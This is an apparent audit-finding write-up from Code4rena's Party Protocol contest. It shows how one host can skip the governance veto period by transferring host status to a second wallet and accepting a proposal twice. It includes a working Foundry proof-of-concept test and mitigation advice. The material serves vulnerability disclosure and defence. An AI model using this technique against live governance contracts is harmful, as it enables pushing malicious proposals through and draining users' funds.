---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/governance
  - sector/privacy
protocol: "[[Party Protocol]]"
auditors:
  - "[[3docSec]]"
report: "https://code4rena.com/reports/2023-10-party"
genome:
  - "[[griefing]]"
  - "[[direct-drain]]"
  - "[[governance-voting-power-snapshot]]"
  - "[[proposal-state-check]]"
---
# [H-02] Single host can unfairly skip veto period for proposal that does not have full host support

- id: 29546
- impact: HIGH
- protocol: [[Party Protocol]]
- reporter: 3docSec (Code4rena)
- source: https://code4rena.com/reports/2023-10-party

## Summary


The bug report discusses a potential vulnerability in the Party governance system. After a proposal is passed, there is a delay before it can be executed to allow for hosts to veto it if necessary. However, a single host can bypass this veto period by transferring their host status to another address and then accepting the proposal multiple times. This could allow for malicious or compromised hosts to push harmful proposals through without proper vetting. A similar exploit was used in the Tornado Cash governance hack in May 2023, resulting in the theft of around $1 million worth of assets. The recommended mitigation steps involve utilizing snapshots for hosts to ensure that only hosts who were present at the time of the proposal can accept it. This vulnerability is classified as high due to the potential for compromised governance. 

## Details


After a proposal passes the vote threshold, there is a delay before it can be executed so that hosts get a chance to `veto` it if they wish. If all hosts voting in favour of the proposal, then this veto period is skipped.

However, a single host can ensure the veto period is skipped even if no other hosts `accept` the proposal. The veto period is in place to prevent harmful/exploitative proposals from being executed, even if they are passed; therefore, a malicious/compromised host being able to skip the veto period can be seriously harmful to the protocol and its users. The [Tornado Cash governance hack](https://medium.com/coinmonks/tornado-cash-governance-hack-ec77ebb3aa68) from May 2023 is a relevant example, during which the attacker was able to steal around `$`1 million worth of assets.

This attack has a very low cost and a very high potential impact. If a malicious proposal is crafted in the same way used by the Tornado Cash attacker using hidden `CREATE2` and `SELFDESTRUCT` operations, then it is entirely feasible that it would meet the voting threshold, as many voters may not be savvy enough to spot the red flags.

### Proof of Concept

`PartyGovernance#abdicateHost` is a function that allows a host to renounce their host privileges, and transfer them to another address.

```solidity
File: contracts\party\PartyGovernance.sol

457:     /// @notice Transfer party host status to another.
458:     /// @param newPartyHost The address of the new host.
459:     function abdicateHost(address newPartyHost) external {
460:         _assertHost();
461:         // 0 is a special case burn address.
462:         if (newPartyHost != address(0)) {
463:             // Cannot transfer host status to an existing host.
464:             if (isHost[newPartyHost]) {
465:                 revert InvalidNewHostError();
466:             }
467:             isHost[newPartyHost] = true;
468:         } else {
469:             // Burned the host status
470:             --numHosts;
471:         }
472:         isHost[msg.sender] = false;
473:         emit HostStatusTransferred(msg.sender, newPartyHost);
474:     }
```

<https://github.com/code-423n4/2023-10-party/blob/main/contracts/party/PartyGovernance.sol#L457>

This can be done at any stage in the life cycle of a proposal. This means that a host can `accept` a proposal, incrementing the `numHostsAccepted` value for that proposal, then transfer the host status to another wallet that they control (that has non-zero voting power) and `accept` again, incrementing `numHostsAccepted` for a second time. This process can be repeated as many times as necessary until `numHostsAccepted` is equal to the total number of hosts `numHosts`. Once the proposal reaches the required vote threshold, the veto period will be skipped, despite only one host accepting.

The following foundry test shows the process described above. Copy and paste it into PartyGovernanceTest.t.sol to run.

```solidity
    function test_maliciousHost() public {
        // Create users
        PartyParticipant alice = new PartyParticipant();
        PartyParticipant bob = new PartyParticipant();
        PartyParticipant chad = new PartyParticipant();
        PartyParticipant aliceAltWallet = new PartyParticipant();

        // Create party
        uint16 passThresholdBps = 5100;
        (
            Party party,
            IERC721[] memory preciousTokens,
            uint256[] memory preciousTokenIds
        ) = partyAdmin.createParty(
                partyImpl,
                PartyAdmin.PartyCreationMinimalOptions({
                    host1: address(alice),
                    host2: address(bob),
                    passThresholdBps: passThresholdBps,
                    totalVotingPower: 151,
                    preciousTokenAddress: address(toadz),
                    preciousTokenId: 1,
                    rageQuitTimestamp: 0,
                    feeBps: 0,
                    feeRecipient: payable(0)
                })
            );

        // alice and bob are the only two hosts
        assert(party.isHost(address(alice)));
        assert(party.isHost(address(bob)));
        assert(!party.isHost(address(chad)));
        assert(!party.isHost(address(aliceAltWallet)));

        // mint governance NFTs
        partyAdmin.mintGovNft(party, address(alice), 50, address(alice));
        partyAdmin.mintGovNft(party, address(bob), 50, address(bob));
        partyAdmin.mintGovNft(party, address(chad), 50, address(chad));
        partyAdmin.mintGovNft(party, address(aliceAltWallet), 1, address(aliceAltWallet));

        // alice proposes a proposal
        PartyGovernance.Proposal memory p1 = PartyGovernance.Proposal({
            maxExecutableTime: 9999999999,
            proposalData: abi.encodePacked([0]),
            cancelDelay: uint40(1 days)
        });
        vm.roll(block.number + 1);
        uint256 proposalId = alice.makeProposal(party, p1, 0);
        
        // chad accepts, but bob (the other host) does not
        vm.roll(block.number + 1);
        chad.vote(party, proposalId, 0);

        // proposal meets vote threshold, but not all hosts have accepted
        vm.roll(block.number + 1);
        (
            PartyGovernance.ProposalStatus status,
            PartyGovernance.ProposalStateValues memory values
        ) = party.getProposalStateInfo(proposalId);
        assertEq(values.numHosts, 2);
        assertEq(values.numHostsAccepted, 1);
        assertEq(uint(status), uint(PartyGovernance.ProposalStatus.Passed)); // not Ready => veto period has not been skipped

        // alice transfers host status to her other wallet address
        vm.prank(address(alice));
        vm.roll(block.number + 1);
        party.abdicateHost(address(aliceAltWallet));

        // alice accepts using her other wallet
        vm.roll(block.number + 1);
        aliceAltWallet.vote(party, proposalId, 0);

        // veto is now skipped even though a host (bob) did not accept
        vm.roll(block.number + 1);
        (status, values) = party.getProposalStateInfo(proposalId);
        assertEq(values.numHosts, 2);
        assertEq(values.numHostsAccepted, 2);
        assertEq(uint(status), uint(PartyGovernance.ProposalStatus.Ready)); // Ready for execution => veto period has now been skipped
    }
```

### Recommended Mitigation Steps

Utilise snapshots for hosts in a similar way to how `votingPower` is currently handled, so that `accept` only increments `numHostsAccepted` if the caller was a host at `proposedTime - 1`. This can be achieved under the current architecture in the following way:

- Add a new `bool` member to the `VotingPowerSnapshot` struct named `isHost`.
- Make `abdicateHost` save new snapshots to the `_votingPowerSnapshotsByVoter` mapping with the updated `isHost` values for the old and new hosts.
- Replace the `isHost[msg.sender]` check in `accept` with a snapshot check, similar to how `getVotingPowerAt` is currently used.

### Assessed type

Governance

**[gzeon (judge) commented](https://github.com/code-423n4/2023-10-party-findings/issues/233#issuecomment-1817856780):**
 > Confirmed by sponsor [here](https://github.com/code-423n4/2023-10-party-findings/issues/538#issuecomment-1810898378).
> Judging as high due to compromised governance.

**[0xble (Party) confirmed](https://github.com/code-423n4/2023-10-party-findings/issues/233#issuecomment-1821298504)**

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-party-findings/issues/233).*

***
